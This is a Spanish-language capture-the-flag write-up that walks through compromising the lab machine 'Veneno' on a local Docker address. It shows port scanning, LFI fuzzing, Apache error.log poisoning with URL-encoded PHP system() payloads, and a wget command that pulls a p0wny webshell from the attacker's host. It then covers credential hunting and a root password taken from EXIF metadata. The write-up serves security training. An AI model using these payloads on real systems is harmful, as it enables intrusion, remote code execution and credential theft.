
# Veneno

<figure><img src="/files/spJQvaIk8xx8nCIyaL4H" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Despliegue de la máquina</mark>

```bash
sudo bash auto_deploy.sh veneno.tar

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2
```

Tenemos la IP: `172.17.0.2`

## <mark style="color:purple;">Primer acceso</mark>

Accedemos través del navegador y llegamos a una default page de Apache:

<figure><img src="/files/EnvKfU8pSyi1cvP1Nkki" alt=""><figcaption></figcaption></figure>

No obtenemos nada relevante, por lo que vamos a escanear los puertos abiertos en esta máquina.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -A -sCV -T5 172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:9c:7b:99:95:b6:e8:03:5a:6a:d4:69:69:4a:8d:35 (ECDSA)
|_  256 ec:ec:90:44:4e:66:64:22:f6:8b:cd:29:d2:b5:60:6a (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
```

Solo encontramos 2 puertos abiertos, el 22 y el 80. En principio nada relevante.

## <mark style="color:purple;">Fuzzing</mark>

Haciendo fuzzing con feroxbuster nos encontramos un directorio interesante:

```bash
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="/files/b5n4Q2XoHjKFPCq8Jqkx" alt=""><figcaption></figcaption></figure>

Encontramos un directorio `/uploads` interesante pero sin ningún archivo en su interior.

Vamos a acceder a `/problems.php` a ver que encontramos. En principio parece lo mismo que index.html, no encontramos nada relevante. Vamos a probar si tiene algún parámetro vulnerable en la URL:

<pre><code><strong>wfuzz --hw=961 -w /usr/share/seclists/Discovery/Web-Content/big.txt -u "http://172.17.0.2/problems.php?FUZZ=/etc/passwd" 
</strong>
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/problems.php?FUZZ=/etc/passwd
Total requests: 20478

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000003022:   200        25 L     32 W       1245 Ch     "backdoor"  
</code></pre>

{% hint style="info" %}
La flag `--hw` en **Wfuzz** sirve para **filtrar respuestas HTTP basadas en el tamaño de las palabras en el cuerpo de la respuesta** (word count, o número de palabras en el contenido). Esto es útil para descartar resultados irrelevantes y enfocarnos en las respuestas de interés al realizar pruebas de enumeración o fuzzing.
{% endhint %}

Encontramos que tiene un parámetro vulnerable "backdoor" con el que podríamos leer archivos del sistema, como /etc/passwd:

<figure><img src="/files/pBlHOaSp7IBjznOeDypy" alt=""><figcaption></figcaption></figure>

Encontramos 2 usuarios con shell interesantes:

* Ubuntu
* Carlos

## <mark style="color:purple;">Local File Inclusion</mark>

Vamos a comprobar que archivos podemos leer del sistema, igual alguno contiene credenciales o información relevante:

```bash
wfuzz --hw=0 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/problems.php?backdoor=FUZZ"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/problems.php?backdoor=FUZZ
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                               
=====================================================================

000000020:   200        25 L     32 W       1245 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"                                 
000000023:   200        25 L     32 W       1245 Ch     "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                                              
000000016:   200        25 L     32 W       1245 Ch     "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"                   
000000129:   200        4 L      36 W       270 Ch      "/etc/apt/sources.list"                                                                               
000000121:   200        225 L    1107 W     7178 Ch     "/etc/apache2/apache2.conf"                                                                           
000000138:   200        47 L     47 W       663 Ch      "/etc/group"                                                                                          
000000135:   200        1 L      6 W        37 Ch       "/etc/fstab"                                                                                          
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                                     
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"                                                                                    
000000205:   200        7 L      16 W       174 Ch      "/etc/hosts"                                                                                          
000000206:   200        7 L      16 W       174 Ch      "../../../../../../../../../../../../etc/hosts"                                                       
000000236:   200        353 L    1042 W     8139 Ch     "/etc/init.d/apache2"                                                                                 
000000260:   200        25 L     32 W       1245 Ch     "../../../../../../../../../../../../../../../../../../../../etc/passwd"                              
000000275:   200        25 L     32 W       1245 Ch     "../../../../../etc/passwd"                                                                           
000000274:   200        25 L     32 W       1245 Ch     "../../../../../../etc/passwd"                                                                        
000000276:   200        25 L     32 W       1245 Ch     "../../../../etc/passwd"                                                                              
000000273:   200        25 L     32 W       1245 Ch     "../../../../../../../etc/passwd"                                                                     
000000277:   200        25 L     32 W       1245 Ch     "../../../etc/passwd"                                                                                                                
000000257:   200        25 L     32 W       1245 Ch     "/etc/passwd"                                                                                         
000000254:   200        25 L     32 W       1245 Ch     "/../../../../../../../../../../etc/passwd"                                                           
000000250:   200        20 L     65 W       526 Ch      "/etc/nsswitch.conf"                                                                                  
000000237:   200        2 L      5 W        24 Ch       "/etc/issue"                                                                                          
000000311:   200        25 L     32 W       1245 Ch     "../../../../../../etc/passwd&=%3C%3C%3C%3C"                                                          
000000422:   200        122 L    387 W      3255 Ch     "/etc/ssh/sshd_config"                                                                                
000000400:   200        41 L     120 W      911 Ch      "/etc/rpc"                                                                                            
000000399:   200        9 L      38 W       242 Ch      "/etc/resolv.conf"                                                                                    
000000502:   200        2 L      15 W       156 Ch      "/proc/net/arp"                                                                                       
000000510:   200        1 L      21 W       191 Ch      "/proc/version"                                                                                       
000000507:   200        0 L      1 W        27 Ch       "/proc/self/cmdline"                                                                                  
000000509:   200        59 L     142 W      1449 Ch     "/proc/self/status"                                                                                   
000000506:   200        7 L      24 W       176 Ch      "/proc/partitions"                                                                                    
000000501:   200        22 L     132 W      1830 Ch     "/proc/mounts"                                                                                        
000000505:   200        18 L     266 W      2700 Ch     "/proc/net/tcp"                                                                                       
000000503:   200        4 L      54 W       449 Ch      "/proc/net/dev"                                                                                       
000000504:   200        3 L      33 W       384 Ch      "/proc/net/route"                                                                                     
000000500:   200        55 L     161 W      1531 Ch     "/proc/meminfo"                                                                                       
000000497:   200        448 L    3456 W     21426 Ch    "/proc/cpuinfo"                                                                                       
000000499:   200        1 L      5 W        25 Ch       "/proc/loadavg"                                                                                       
000000498:   200        67 L     1364 W     14640 Ch    "/proc/interrupts"                                                                                    
000000929:   200        25 L     32 W       1245 Ch     "///////../../../etc/passwd"                                                                          
000000654:   200        243876   4478599    36123188    "../../../../../../../var/log/apache2/error.log"                                                                                                                                                          
000000652:   200        243880   4478701    36124146    "/var/log/apache2/error.log"   
```

También podríamos filtrar por archivos de log con `grep`:

```bash
wfuzz --hw=0 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://172.17.0.2/problems.php?backdoor=FUZZ" | grep log

000000219:   200        0 L      0 W        0 Ch        "/etc/httpd/logs/acces.log"                                                                           
000000402:   200        0 L      0 W        0 Ch        "/etc/security/failedlogin"                                                                           
000000477:   200        0 L      0 W        0 Ch        "/opt/lampp/logs/error.log"                                                                           
000000480:   200        0 L      0 W        0 Ch        "/opt/xampp/logs/access.log"                                                                          
000000482:   200        0 L      0 W        0 Ch        "/opt/xampp/logs/error.log"                                                                           
000000479:   200        0 L      0 W        0 Ch        "/opt/xampp/logs/access_log"                                                                          
000000476:   200        0 L      0 W        0 Ch        "/opt/lampp/logs/error_log"                                                                           
000000464:   200        0 L      0 W        0 Ch        "../../logs/error.log"                                                                                
000000654:   200        247200   4563221    36912656    "../../../../../../../var/log/apache2/error.log"                                                      
000000652:   200        247200   4563221    36912656    "/var/log/apache2/error.log" 
```

Encontramos un archivo de logs interesante en `/var/log/apache2/error.log`

## <mark style="color:purple;">Log poisoning</mark> <a href="#log-poisoning" id="log-poisoning"></a>

Ahora que tenemos el access.log a disposición , vamos a tratar de envenenarlo. El envenamiento de este log ocurre cuando introducimos un error y este se registra en `/var/log/apache2/error.log`, y aprovechamos este comportamiento para inyectar codigo malicioso en el registro.

Abrimos desde el navegador el error.log:&#x20;

```
http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
```

Ahora vamos a solicitar un archivo que no existe para que veamos el comportamiento:

```bash
curl http://172.17.0.2/prueba.php
```

Enviamos la solicitud (con curl) y refrescamos la web en error.log, lo que tuvo que registrar la solicitud que hicimos. Vemos que al final del todo del archivo error.log se registra correctamente el prueba.php que no existe. Nos vamos aprovechar de esto para envenenar el registro con código malicioso php.

{% code title="error.log" %}

```
<------SNIP------>
[Wed Jan 15 08:42:34.011936 2025] [php:error] [pid 562] [client 172.17.0.1:57996] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 95914440 bytes) in /var/log/apache2/access.log on line 7
[Wed Jan 15 08:42:50.486459 2025] [php:error] [pid 168] [client 172.17.0.1:58480] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 95914440 bytes) in /var/log/apache2/access.log on line 7
[Wed Jan 15 08:42:55.062927 2025] [php:warn] [pid 195] [client 172.17.0.1:58482] PHP Warning:  include(/opt/xampp/logs/error.log): Failed to open stream: No such file or directory in /var/www/html/problems.php on line 5
[Wed Jan 15 08:42:55.062996 2025] [php:warn] [pid 195] [client 172.17.0.1:58482] PHP Warning:  include(): Failed opening '/opt/xampp/logs/error.log' for inclusion (include_path='.:/usr/share/php') in /var/www/html/problems.php on line 5
[Wed Jan 15 08:43:25.637601 2025] [php:warn] [pid 200] [client 172.17.0.1:36032] PHP Warning:  include(/opt/xampp/logs/error.log): Failed to open stream: No such file or directory in /var/www/html/problems.php on line 5
[Wed Jan 15 08:43:25.637662 2025] [php:warn] [pid 200] [client 172.17.0.1:36032] PHP Warning:  include(): Failed opening '/opt/xampp/logs/error.log' for inclusion (include_path='.:/usr/share/php') in /var/www/html/problems.php on line 5
[Wed Jan 15 08:47:27.367153 2025] [php:error] [pid 199] [client 172.17.0.1:33082] script '/var/www/html/prueba.php' not found or unable to stat
```

{% endcode %}

Podemos usar por ejemplo el siguiente payload:

```bash
curl http://172.17.0.2/<?php system('id') ?>.php
```

Debemos urlencodear `<?php system('id') ?>.php` para que pueda ser interpretado por el navegador, Lo podemos hacer con Burp Decoder:

```bash
curl http://172.17.0.2/%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%20%3f%3e%2e%70%68%70
```

Al enviar el curl vemos que se ejecuta el comando id en el archivo de error.log, con lo que podemos probar a cargar un script php que nos envíe una reverse shell.

{% code title="error.log" %}

```
<------SNIP------>
[Wed Jan 15 08:42:55.062927 2025] [php:warn] [pid 195] [client 172.17.0.1:58482] PHP Warning:  include(/opt/xampp/logs/error.log): Failed to open stream: No such file or directory in /var/www/html/problems.php on line 5
[Wed Jan 15 08:42:55.062996 2025] [php:warn] [pid 195] [client 172.17.0.1:58482] PHP Warning:  include(): Failed opening '/opt/xampp/logs/error.log' for inclusion (include_path='.:/usr/share/php') in /var/www/html/problems.php on line 5
[Wed Jan 15 08:43:25.637601 2025] [php:warn] [pid 200] [client 172.17.0.1:36032] PHP Warning:  include(/opt/xampp/logs/error.log): Failed to open stream: No such file or directory in /var/www/html/problems.php on line 5
[Wed Jan 15 08:43:25.637662 2025] [php:warn] [pid 200] [client 172.17.0.1:36032] PHP Warning:  include(): Failed opening '/opt/xampp/logs/error.log' for inclusion (include_path='.:/usr/share/php') in /var/www/html/problems.php on line 5
[Wed Jan 15 08:47:27.367153 2025] [php:error] [pid 199] [client 172.17.0.1:33082] script '/var/www/html/prueba.php' not found or unable to stat
[Wed Jan 15 08:56:47.567679 2025] [php:error] [pid 168] [client 172.17.0.1:43634] script '/var/www/html/uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

{% endcode %}

## <mark style="color:purple;">Subida de webshell</mark>

Tenemos ejecucion de comandos a traves del envenamiento de error.log asi que ahora vamos a cargar un script php que nos envie una reverse shell. Vamos a tratar de subir un webshell, en mi caso voy a usar [PownyShell](https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/webshells/php-webshell#p0wny-shell)

```bash
git clone https://github.com/flozz/p0wny-shell.git
cd p0wny-shell
```

Vamos a renombrar nuestro `shell.php` a `index.html` y vamos a levantar un servidor local con python por el puerto 80.

```bash
cp shell.php index.html
python3 -m http.server 80
```

Ahora vamos a crear un payload para descargar en el servidor web dentro de `/uploads` el index.html que tenemos levantado con python, una vez descargado le cambiamos el nombre a `shell.php`, el payload final quedaría así:

```php
<?php system('cd uploads;wget 192.168.150.131;mv index.html shell.php') ?>.php
```

```bash
cd uploads		   # Accedemos a uploads
wget 172.17.0.1		   # Descargamos el index.html que levantamos con python
mv index.html shell.php   # Renombramos a index.html como script.php
```

Ahora lo urlencodeamos:

```
%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%64%20%75%70%6c%6f%61%64%73%3b%77%67%65%74%20%31%39%32%2e%31%36%38%2e%31%35%30%2e%31%33%31%3b%6d%76%20%69%6e%64%65%78%2e%68%74%6d%6c%20%73%68%65%6c%6c%2e%70%68%70%27%29%20%3f%3e%2e%70%68%70
```

Y lo enviamos al servidor con el siguiente comando:

```shell-session
afsh4ck@kali$ curl "http://172.17.0.2/%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%64%20%75%70%6c%6f%61%64%73%3b%77%67%65%74%20%31%39%32%2e%31%36%38%2e%31%35%30%2e%31%33%31%3b%6d%76%20%69%6e%64%65%78%2e%68%74%6d%6c%20%73%68%65%6c%6c%2e%70%68%70%27%29%20%3f%3e%2e%70%68%70"

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at 172.17.0.2 Port 80</address>
</body></html>
```

Ahora al recargar error.log aparece el log, y si vamos al directorio /uploads vemos que se ha cargado correctamente la webshell:

<figure><img src="/files/gPDIuFU3839IQ2uZGEoV" alt=""><figcaption></figcaption></figure>

Al acceder entremos a la webshell y podemos ejecutar comandos:

<figure><img src="/files/pbjcjGJkokSJPnPbc1y6" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Escalada de privilegios</mark>

No podemos acceder a los directorios home de los usuarios carlos y ubuntu, por lo que haremos un poco de research. En el directorio `/var/www/html` encontramos un archivo interesante:

<figure><img src="/files/Sy2a2hoFIPkxTnOoR5We" alt=""><figcaption></figcaption></figure>

Vamos a aplicar técnicas de [credential hunting en Linux](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/linux-attacks/credential-hunting-linux.md) para buscar archivos de contraseñas:

```bash
find / -type f -perm -o+r 2>/dev/null | grep .txt

/var/www/html/antiguo_y_fuerte.txt
/usr/sbin/httxt2dbm
/usr/share/terminfo/t/ts100-ctxt
/usr/share/terminfo/a/aaa-30-ctxt
/usr/share/terminfo/a/aaa-s-ctxt
/usr/share/terminfo/a/aaa-s-rv-ctxt
/usr/share/terminfo/a/aaa-30-rv-ctxt
/usr/share/terminfo/g/guru-nctxt
/usr/share/viejuno/inhackeable_pass.txt   # Posible archivo de credenciales 
/usr/share/mime/text/x-txt2tags.xml
/usr/share/mime/text/x-todo-txt.xml
/usr/share/perl/5.38.2/Unicode/Collate/keys.txt
/usr/share/perl/5.38.2/Unicode/Collate/allkeys.txt
```

```shell-session
www-data@aea87c927a66:…/www/html# cat /usr/share/viejuno/inhackeable_pass.txt
pinguinochocolatero
```

Desde la webshell no nos deja cambiar al usuario carlos para probar esta contraseña, por lo que vamos a loguearnos por SSH como el usuario carlos:

```shell-session
afsh4ck@kali$ ssh carlos@172.17.0.2                                      
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:JjCuDHTk717D4/V1Fz7F53s4McfRTmFI9VHabipcJEo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
carlos@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

carlos@aea87c927a66:~$ id
uid=1001(carlos) gid=1001(carlos) groups=1001(carlos),100(users)
```

Si hacemos un `ls` para ver los archivos nos encontramos con multitud de carpetas::

<figure><img src="/files/O1sbKENugZ6ciCUKvACK" alt=""><figcaption></figcaption></figure>

Podemos usar el siguiente comando para buscar archivos comunes:

```shell-session
carlos@aea87c927a66:~$ find /home/carlos/ -type f

/home/carlos/.bashrc
/home/carlos/.bash_logout
/home/carlos/.profile
/home/carlos/.cache/motd.legal-displayed
/home/carlos/carpeta55/.toor.jpg
```

```shell-session
carlos@aea87c927a66:~/carpeta55$ pwd
/home/carlos/carpeta55
carlos@aea87c927a66:~/carpeta55$ ls
carlos@aea87c927a66:~/carpeta55$ ls -la
total 624
drwxr-xr-x 2 root   root     4096 Jun 29  2024 .
drwxr-x--- 1 carlos carlos   4096 Jan 15 10:14 ..
-rw-r--r-- 1 root   root   627985 Jun 29  2024 .toor.jpg
```

Vamos a enviarnos la imagen a nuestro kali para examinarla:

```bash
# En el server
python3 -m http.server 8000

# En kali
curl -O http://172.17.0.2:8000/.toor.jpg
mv .toor.jpg toor.jpg
```

Vamos a analizar la imagen con exiftool:

```shell-session
afsh4ck@kali$ exiftool toor.jpg       
       
ExifTool Version Number         : 13.00
File Name                       : toor.jpg
Directory                       : .
File Size                       : 628 kB
File Modification Date/Time     : 2025:01:15 00:23:44+00:00
File Access Date/Time           : 2025:01:15 00:23:44+00:00
File Inode Change Date/Time     : 2025:01:15 00:25:52+00:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Quality                   : pingui1730
Image Width                     : 2048
Image Height                    : 2048
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2048x2048
Megapixels                      : 4.2
```

En Image Quality encontramos una posible contraseña: `pingui1730`

La probamos con el usuario root y funciona!

```shell-session
carlos@aea87c927a66:~/carpeta55$ su root
Password: 
root@aea87c927a66:/home/carlos/carpeta55# id
uid=0(root) gid=0(root) groups=0(root)
root@aea87c927a66:~# whoami
root
```
